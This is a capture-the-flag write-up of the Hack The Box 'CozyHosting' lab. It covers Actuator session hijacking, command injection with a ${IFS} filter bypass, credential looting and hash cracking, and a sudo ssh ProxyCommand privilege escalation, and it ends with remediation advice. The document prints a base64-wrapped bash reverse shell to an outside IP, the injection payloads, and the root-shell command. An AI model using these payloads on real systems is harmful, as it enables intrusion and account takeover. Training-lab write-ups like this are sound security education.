# CozyHosting — Hack The Box

<p align="left">
  <img src="./assets/cozyhosting/00-card.png" alt="CozyHosting HTB machine card" width="650">
</p>

| | |
|---|---|
| **Platform** | Hack The Box |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Status** | ✅ Retired |
| **Key techniques** | Spring Boot Actuator session hijack, OS command injection (`${IFS}` bypass), JAR credential looting, bcrypt cracking, sudo `ssh` ProxyCommand (GTFOBins) |

---

## TL;DR

CozyHosting runs a misconfigured Spring Boot application. An exposed
`/actuator/sessions` endpoint leaks the administrator's session cookie,
which I reuse to hijack the admin session. The admin dashboard's SSH
"connection settings" feature is vulnerable to OS command injection in
the `username` field — bypassing its whitespace filter with `${IFS}` and
a base64-encoded payload gives a shell as `app`. The application JAR holds
a PostgreSQL connection string; the database yields a bcrypt hash that
cracks and reuses over SSH as `josh`. Finally, `josh` can run `ssh` as
root via `sudo`, which I abuse with `ProxyCommand` for a root shell.

---

## Recon

```bash
sudo nmap -sCV 10.129.229.88
```

![nmap scan](./assets/cozyhosting/01-nmap.png)

SSH (22) and HTTP (80, nginx). The site redirects to `cozyhosting.htb`,
so I added it to `/etc/hosts`.

---

## Web Enumeration

Directory brute-forcing revealed a Spring Boot app with an exposed
**Actuator**:

```bash
dirsearch -u http://cozyhosting.htb
```

![dirsearch finding the actuator endpoints](./assets/cozyhosting/02-dirsearch.png)

The `/actuator/sessions` endpoint leaks active session IDs — including the
administrator's (`kanderson`):

![/actuator/sessions leaking the admin session](./assets/cozyhosting/03-actuator-sessions.png)
![the leaked admin session cookie](./assets/cozyhosting/04-admin-cookie.png)

### Session hijack

I replaced my `JSESSIONID` with the leaked admin value and refreshed —
now authenticated as admin:

![swapping in the leaked session cookie](./assets/cozyhosting/05-cookie-swap.png)
![authenticated admin dashboard](./assets/cozyhosting/06-admin-dashboard.png)

---

## Foothold — OS command injection

The dashboard's "connection settings" feature takes a `host` and
`username` and runs `ssh` against them. The `username` is dropped straight
into a shell command:

![the connection settings feature](./assets/cozyhosting/07-connection-settings.png)

The field rejects **whitespace**, so I used `${IFS}` (the shell's internal
field separator) and confirmed injection with a time-based probe — the
response hung for 5 seconds:

```text
host=test&username=;sleep${IFS}5;
```

![whitespace filter bypass with ${IFS}](./assets/cozyhosting/08-ifs-bypass.png)
![time-based injection confirmed](./assets/cozyhosting/09-time-based.png)

A raw `bash -i` reverse shell has too many special characters, so I
base64-encoded it and injected only the decode-and-run, using `${IFS}`
for every space:

```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.172/4444 0>&1' | base64
# injected username:
;echo${IFS}<base64>|base64${IFS}-d|bash;
```

![building the base64 reverse shell payload](./assets/cozyhosting/10-b64-payload.png)

Caught a shell as the `app` service account:

![reverse shell as app](./assets/cozyhosting/11-app-shell.png)

---

## Lateral Movement — app → josh

After stabilising the shell, I found the Spring Boot JAR in `/app`, pulled
it to Kali, and searched it for credentials:

![the application JAR](./assets/cozyhosting/12-jar.png)
![downloading the JAR to Kali](./assets/cozyhosting/13-download-jar.png)

`application.properties` inside the JAR held a **PostgreSQL** connection
string:

![postgres credentials in application.properties](./assets/cozyhosting/14-postgres-creds.png)

### Database

Connected with `psql` and enumerated the `cozyhosting` database:

```sql
\dt
SELECT * FROM users;
```

![psql connected](./assets/cozyhosting/15-psql.png)
![users table](./assets/cozyhosting/16-users-table.png)

The `users` table held a bcrypt hash for the `admin` account:

![admin bcrypt hash](./assets/cozyhosting/17-admin-bcrypt.png)

### Cracking

```bash
hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt
```

![hashcat cracking the bcrypt hash](./assets/cozyhosting/18-hashcat-crack.png)

Password: `manchesterunited`. There is a local user `josh`, and the
password reuses — logged in over SSH and read the user flag:

```bash
ssh josh@cozyhosting.htb
```

![SSH as josh](./assets/cozyhosting/19-ssh-josh.png)
![user flag](./assets/cozyhosting/20-user-flag.png)

---

## Privilege Escalation — sudo ssh (GTFOBins)

`sudo -l` shows `josh` may run `/usr/bin/ssh` as root:

![sudo -l allowing ssh as root](./assets/cozyhosting/21-sudo-l.png)

Per GTFOBins, `ssh` can execute arbitrary commands via its `ProxyCommand`
option — running it as root gives a root shell:

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![abusing ssh ProxyCommand](./assets/cozyhosting/22-proxycommand.png)
![root shell](./assets/cozyhosting/23-root-shell.png)

Read the final flag from `/root/root.txt`:

![root flag](./assets/cozyhosting/24-root-flag.png)

---

## Lessons Learned

- Spring Boot Actuator endpoints (`/actuator/*`) are a recurring win —
  `/sessions` alone handed over an authenticated admin session here.
- A whitespace filter is not a command-injection fix: `${IFS}` sidesteps
  it, and base64 smuggles past character restrictions.
- Java JARs are just ZIPs — always unpack them and grep for
  `application.properties` / hardcoded credentials.
- `sudo -l` first on every Linux box; a single GTFOBins entry (`ssh`) was
  the whole privesc.

---

## Remediation

- Never expose Spring Boot Actuator to unauthenticated users; disable
  `/sessions` or lock it behind authentication.
- Sanitize/allowlist input passed to shell commands instead of filtering
  whitespace.
- Don't ship database credentials inside application artifacts.
- Remove `ssh` from sudoers, or constrain it so `ProxyCommand` abuse isn't
  possible.

---

## Tools used

- `nmap`
- `dirsearch`
- Burp Suite
- `psql`
- `hashcat`
- `ssh`

---

**See also:** [Linux privilege escalation methodology](../../methodology/linux-privesc.md)

---

**Machine:** [Hack The Box — CozyHosting](https://www.hackthebox.com/machines/cozyhosting)

**Live version:** [read this write-up on my blog](https://debasjan.github.io/writeups/cozyhosting/)
